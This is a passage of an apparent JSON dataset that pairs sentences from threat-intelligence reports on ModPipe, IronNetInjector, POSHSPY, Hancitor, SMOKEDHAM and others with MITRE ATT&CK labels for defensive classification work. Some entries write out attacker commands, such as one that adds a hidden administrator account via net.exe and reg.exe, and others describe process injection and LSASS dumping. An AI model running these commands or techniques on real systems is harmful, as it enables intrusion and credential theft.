    "text": "Based on our findings, it is typically associated with one of the following legitimate processes: MDSHTTPService.exe (MICROS MDS HTTP Service) CALSrv.exe (MICROS CAL Service – Client Application Loader server) msdtc.exe jusched.exe spoolsv.exe services.exe Differences between the injected processes misused by GetMicInfo and those targeted by ModScan 2.20 might be caused by the fact that GetMicInfo module is injected only into processes running under WOW64. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The list of IP addresses intended for scanning and the special “ping” IP address are specified by the C&C in one of two ways.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "It is either: downloaded from the C&C along with the ModScan module, or received during runtime, using the named pipe associated with the ModScan module. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ModScan 2.20 module pipe commands Command nameCommand description exitExit stopTerminate scanning threads scanStart scanning IPs specified in the command data to collect additional information about the environment prmSpecify special “ping” IP address Scanning procedure routine Before scanning, the module sends a special “ping” message containing a 32-bit value generated by the GetTickCount Windows API function to TCP ports 50123 (used by MDS HTTP Service) and 2638 (used by SAP Sybase database server) of the “ping” IP address. ",
    "command": "",
    "labels": [
      "T1016",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "If the response on at least one of the ports provides the appropriate value, the module will start the scan of the selected IP addresses.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Hex-Rays decompiled code of the ModScan ping functionality When the ModScan module starts the scan, some of the following information may be gathered, depending on the parameters received along with the scan command: Version of the Oracle MICROS RES 3700 POS, which is acquired by sending an HTTP Post message (see Figure 5) to the specified IP address on port 50123 used by the MDS HTTP Service.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The response includes a Login Acknowledgement packet which, in both cases – success and failure – contains information about the database server and the TDS versions used.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The TDS login packet is hardcoded, with username set to the built-in dba and a hardcoded password, which is potentially the default password in some RES 3700 POS versions.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Its main purpose is to collect information about currently running processes, including: name, process identifier (PID), parent process PID, number of threads, token owner, token domain, process creation time, and command line. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Optionally, ProcList can also collect information about loaded modules for each of the running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The dropper component can drop the loader into two possible locations and set up the persistence mechanism by creating a Windows service or Windows registry Run key (for details, please refer to the Indicators of Compromise section). ",
    "command": "",
    "labels": [
      "T1112",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Persistent loader This component is responsible for both unpacking the main module and for its injection into one of the following processes: lsass.exe wininit.exe services.exe To unpack the main module, the persistent loader uses different approaches for the 32-bit and 64-bit versions.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It then periodically checks the pipe for new messages using the PeekNamedPipe Windows API function.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "List of pipe message/command types Message codeDescription 0x10000012inject and execute received module in specified process 0x10000013data for C&C server (execution logs, stolen data, …) ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "0x10000023set C&C communication time intervals 0x10000024close received list of handles 0x10000025get handle of the process with specified PID, duplicate it for some other specified process and send it through the received named pipe handle 0x10000072C&C commands (encrypted) – see Table 4 for the full list of available commands For the detailed structure and format used for the messages transferred through the pipe refer to Figure 10. Figure 10.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Structure of the main module’s named pipe messages For communication with its C&C server, the main module uses HTTP and port 80.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "To select the process for injection, the main module enumerates running processes and assigns them a priority value between 3 and 6.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Those with higher priority are injected first, based on the following criteria: Priority 6 The highest priority, assigned to any process that has already been used successfully to inject a networking module, received a response from the C&C and that is still running under the same PID, name and CreationTime. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Priority 5 Process name with no extension that matches one of the following process names used for browsers: iexplore, opera, chrome, firefox Priority 4 Process name with no extension that matches the following process names: explorer, svchost Priority 3 All the other running processes excluding the following system processes: system, lsass, csrss, lsm, winlogon, smss, wininit The main reason behind the priority list is to inject processes that are expected to communicate over the network and at the same time avoid system processes that might attract attention if caught communicating over the network. ",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Networking module This ModPipe module is responsible for sending requests to C&C and parsing payload received in the C&C responses.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "HTTP POST or GET methods with headers shown in Figure 12 and Figure 13 can be used to upload data to C&C and download additional payloads and C&C commands. ",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "List of available main module commands Command codeCommand description 0x01Exit 0x05Update list of C&C addresses 0x0AInject and execute received module in specified process 0x0BInject and execute received module in specified process (module name is included in the command) 0x0COptionally write module to the encrypted storage, then inject and execute received module in specified process – add it to the list of the installed modules 0x0DSend command to the named pipe belonging to the module with specified ID and queue the response for the upload to the C&C 0x0EUninstall module with specified ID (remove from the in-memory list and encrypted storage) ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Probably the most intriguing finding is the algorithm hidden in one of the backdoor’s modules, which was specifically designed to steal credentials by decrypting them from registry values.",
    "command": "",
    "labels": [
      "T1005",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Windows Command ShellAttackers were seen using Windows Command Shell to execute the initial dropper. PersistenceT1547.001Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderModPipe can use Registry Run key for persistence. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows ServiceModPipe can create a new service for persistence. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Defense EvasionT1055.002Process Injection: Portable Executable InjectionModPipe can inject it’s modules into various processes. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Credential AccessT1552.002Unsecured Credentials: Credentials in RegistryModPipe’s GetMicInfo module retrieves encrypted database passwords for ORACLE MICROS RES 3700 POS software from Windows Registry and uses a custom algorithm to decrypt them before uploading to the C&C. DiscoveryT1057Process DiscoveryModPipe’s ProcList module can get information about processes running on a system. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "T1012Query RegistryModPipe’s GetMicInfo module queries the Registry for ORACLE MICROS RES 3700 POS version, database passwords and other configuration data. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "T1033System Owner/User DiscoveryModPipe gathers username and computer name from victim machines and reports them to the C&C in initial message. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Command and ControlT1071.001Application Layer Protocol: Web ProtocolsModPipe uses HTTP for command and control. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Figure 5: A timestamp mechanism in the code Looking at this, we can see a while loop that calls the check_timestamp function and receives a 64-bit integer value from GetSystemTimeAsFileTime Api call.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Only once the results of check_timestamp are greater than the manifest timestamp will the code proceed and generate the HTTP request to connect with GitHub, which initiates the payload download. ",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "If you’re not familiar with this instruction set, here’s two of my favorite resources to get you up to speed: Opening the malware in a disassembler, (starting at its main) we spot some (fairly common) anti-debugging logic: main ... 000000010000b108 bl imp___stubs__getppid 000000010000b10c mov x1, x0 000000010000b110 mov w0, #0x1f 000000010000b114 mov x2, #0x0 000000010000b118 mov w3, #0x0 000000010000b11c bl imp___stubs__ptrace 000000010000b120 cmn w0, #0x1 In short, this snippet of code invokes ptrace with PT_DENY_ATTACH (0x1f) which will kill the process if a debugger is currently attached, and also prevent future attachments. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "f_out.write(encrypted_chunk) ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This produces strings including a commandline usage: Usage: %s",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "-i, --indir path to crypt -m, --minfile minimal size of a crypted file, no less than 4096 -r, --remove self remove this file after work -l, --log prints the log to the console -n, --nolog do not print the log to the file /tmp/locker.log -d, --daemonize runs a program as Unix daemon -w, --wholefile encrypts whole file -b, --beginfile encrypts first N bytes -e, --extentions encrypts files by extentions -o, --nostop prevent to stop working VM -t, --wipe wipe free space -s, --spot upper bound limitation value of spot in Mb -p, --pass password -f, --full full log -a, --delay start delay in minutes -y, --noexts do not search for extentions -v, --vmdk search for extentions inside VMDK files Clearly these match to the global variables that apparently can be set via the command-line as well.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This parses command-line options (updating global variables is relevant), and performs various other initializations, such as invoking a function named sodium_init (likely to initialize the commonly used Sodium crypto library).",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "And further: IronPython’s sweet-spot is being able to use the .NET framework APIs directly from Python. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "With IronPython, you can use .NET framework APIs directly in your Python script.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "You can make use of the .NET framework APIs without having to compile a .NET assembly.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Also, IronPython scripts don’t run with the original Python interpreter when .NET framework APIs are used in the code.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "When an IronPython script is run, the .NET injector gets loaded, which in turn injects the payload(s) into its own or a remote process. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Both versions are full-blown PE injection tools able to load a native x86/64 payload reflectively into a remote process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Most of its code is taken from PowerShell Empire’s ReflectivePEInjection script and got translated into C#.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The newer version additionally contains the ability to inject .NET assemblies into unmanaged processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It also shows which other samples uploaded by the same submitter or the other submitters are connected and gives the assumed embedded malware: Submitter IronPython script(s) uploads Related samples uploaded by same submitter Payload assumptions 1 • prophile.py • profilec.py • IronPython-2.7.7z: Portable IronPython version that contains the two IronPython scripts and a Windows task XML to start profilec.py • prophile.py: .NET injector (variant 2018)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Windows task XML file for IronNetInjector.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The task is used to start an IronPython script with the 64-bit version of the interpreter.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "As a command line argument, the Rijndael decryption key is passed.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The task’s description is PythonUpdateSrvc and it runs either on Windows startup when a user logs in or when one of two system events get created: Figure 3.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The IronPython scripts and the Windows task XML were placed in the same directory.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The task file is then used to create a task which in turn starts a script when triggered.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "However, it’s also possible that the submitter collected the files from different places and just bundled them into an archive for scanning purposes.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "After the injector assembly is loaded, the ID of the process where the ComRAT DLL gets injected is retrieved.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The output is then parsed to the targeted process ID with the help of tasklist filters.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Contains 32-/64-bit bootstrappers to load an assembly into an unmanaged process. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Contains the imported unmanaged function declarations and win32 structures/constants. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The method InjectAssembly is used to inject a .NET assembly into a native process (or its own) and InvokeAssemblyMethod to call any chosen method of the injected assembly.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The method Invoke is used to inject a native PE into a remote process and InvokeVoid to call any exported function of the injected payload. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Depending on the number of arguments passed to DefaultSerializer on creation time, the payload is either loaded into its own process or a remote one.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The other options are to also pass the ID or handle of the remote process the payload gets injected to. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In our case, the second option is used with the PID of explorer.exe to load the ComRAT payload reflectively into the process. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "One other interesting aspect of the injector is its ability to load an assembly into an unmanaged process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This is accomplished with a native bootstrapper DLL, which gets injected into the remote process and prepares it so a .NET assembly can be injected afterwards. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI).",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Later in that same engagement, the attacker updated the deployment of the backdoor to use WMI for storage and persistence.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "WMI provides many administrative capabilities on local and remote systems, including querying system information, starting and stopping processes, and setting conditional triggers.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Users with sufficient system-level privileges can define custom classes or extend the functionality of the many default classes. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "WMI permanent event subscriptions can be used to trigger actions when specified conditions are met.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "WMI Consumers specify an action to be performed, including executing a command, running a script, adding an entry to a log, or sending an email.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Creating a WMI permanent event subscription requires administrative privileges on a system. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "To store the code, APT29 created a new WMI class and added a text property to it in order to store a string value.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "POSHSPY WMI Component The WMI component of the POSHSPY backdoor leverages a Filter to execute the PowerShell component of the backdoor on a regular basis. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Figure 1: “BfeOnServiceStartTypeChange” WMI Query Language (WQL) filter condition ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Downloading and executing PowerShell code as an EncodedCommand 2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Enabling and monitoring enhanced PowerShell logging can capture malicious code as it executes and legitimate WMI persistence is so rare that malicious persistence quickly stands out when enumerating it across an environment.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "This presentation by Christopher Glyer and Devon Kerr contains additional information on attacker use of WMI in past Mandiant investigations. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The FireEye FLARE team released a WMI repository-parsing tool that allows investigators to extract embedded data from the WMI repository and identify WMI persistence. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Its main purpose is to download and execute a second stage malware payload from one of multiple encrypted URLs contained in the malware itself.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When opened, the user sees a social engineering image telling them that they must click the “Enable editing” button to see the document’s contents. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Figure 1 – Word document lure requesting the user to run the VBA macro. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "As the VBA code does not know where the file was stored, it then recursively searches through all local temp folders. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Once the “.tmp” file is found, it is moved and renamed to the Office templates folder (C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Templates) as “W0rd.dll” and loaded using rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "As a second argument, the macro passes the entry function “DllUnregisterServer” to rundll32.exe so that the execution starts correctly. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Figure 4 – VBA macro which runs rundll32.exe to load the malware. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The names of Windows API functions are stored in the first 150 bytes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Figure 7 – Structure of the encrypted section. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The API function located at the beginning of the memory section are resolved using GetProcAddress.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This technique is called self-injection or PE overwrite.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "To make the new image runnable, several Windows API functions are resolved using GetProcAddress and directly patched into the memory of the loaded executable.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This function obtains the username, the computer name and the domain of infected system.",
    "command": "",
    "labels": [
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The subsequent functions collect additional information such as the machine’s public IP address, domain trust information and the computer architecture.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The malware identifies the computer’s public IP address by making a HTTP GET request to “hxxp://api.ipify[.]org”, a free public IP address API.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "All the collected information is then put together into a query string which is generated based on the computer architecture. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "After successfully decrypting the C2 URLs, the data is sent there using a HTTP POST request adding the constructed query string as data.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "If the decryption leads to a valid URL, the malware initiates a download, which delivers an executable.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "To execute the binary, Hancitor uses one of the following techniques: Create Process Create Thread Process Hollowing Thread Execution Hijacking Create Process If the method “Create Process” is chosen, then the malware writes the retrieved executable to disk into the temp folder and executes it using rundll32.exe with “start” as the argument for the entry function. ",
    "command": "",
    "labels": [
      "T1055",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The malware simply allocates some memory, writes the malware into it and creates a new thread from it. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process Hollowing If the Process Hollowing method is used, a new svchost.exe process is created in a suspended state.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The malware then allocates new memory in the newly-created process, writes the executable to it and executes it in a new thread. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Figure 13 – Process creation function. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Thread Execution Hijacking The final execution method Hancitor supports is Thread Execution Hijacking.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This method is mostly the same as the above described Process Injection method.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The only difference is that the malware replaces the thread context with the downloaded executable and resumes it afterwards. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The latter is launched with a command line URL executing the content. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4. Figure 4: CyberChef diff between MSHTA.exe and smartpss.exe Phase 3: Downloaded VBScript and PowerShell Upon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the command line. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 5: PCAP from e9ed774517e129a170cdb856bd13e7e8 VirusTotal results not returning malicious content Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 6: SMOKEDHAM downloader Within seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line Compiler. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SMOKEDHAM Network Communications SMOKEDHAM communicates with its C2 server using HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1. Keyword Action delay Update its sleep interval screenshot Upload a screen capture to its C2 server via a subsequent HTTP POST request exit Terminate Table 1: Plaintext command data keywords If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "net.exe user net.exe users whoami.exe whoami.exe /priv systeminfo.exe ",
    "command": "",
    "labels": [
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "net.exe user DefaultUser REDACTED /ADD net.exe localgroup Administrators DefaultUser /ADD reg.exe ADD 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList' /v ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The following commands facilitated lateral movement by modifying Terminal Server registry key values to enable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA) registry key value to require a password for authentication. ",
    "command": "",
    "labels": [
      "T1021.001",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Phase 6: Follow-on Activity SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "%appdata%\\Chrome\\winvnc.exe NGROK Configuration SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\console.lnk Cobalt Strike Beacon The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using Command Prompt. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory.",
    "command": "",
    "labels": [
      "T1105",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Mandiant was not able to recover update.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt Strike stageless payload. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "LSASS Dumping and Lateral Movement Mandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "DMP, and later, zip the dump into two files named lsass.zip and lsass2.zip located in the C:\\ProgramData\\psh\\ directory. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "From this point, the attacker was observed moving laterally to different systems in the environment using Remote Desktop Protocol (RDP) connections. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Five days later, UNC2465 returned and deployed additional tools such as a keylogger, Cobalt Strike BEACON, and conducted credential harvesting via dumping LSASS memory. ",
    "command": "",
    "labels": [
      "T1003.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This is a vulnerability in F5’s Big-IP Traffic Management User Interface that allows cyber threat actors to execute arbitrary system commands, create or delete files, disable services, and/or execute Java code.[7] CVE-2019-19781:",
    "command": "",
    "labels": [
      "T1059.003",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "CVE-2019-19781 enabled the actors to execute directory traversal attacks.[8] CVE-2019-11510:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It contains a number of tools that complement the cyber threat actor’s exploitation efforts, such as a keystroke logger, file injection capability, and network services scanners.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz CISA has observed the actors using Mimikatz during their operations.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Credential Dumping: Local Security Authority Subsystem Service (LSASS) Memory CISA observed the threat actors using Mimikatz in conjunction with coin miner protocols and software.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The actors used Mimikatz to dump credentials from the OS using a variety of capabilities resident within the tool. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The purpose of the payloads are to create persistence and download further malware payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Malicious Microsoft Excel Files The Excel payloads simply contain an Equation Editor exploit that creates two different scheduled tasks.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "One scheduled task (shown below) runs every 15 minutes, to download a next stage EXE payload using cURL, also sending the actor the name of the infected machine.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1105"
    ]
  },
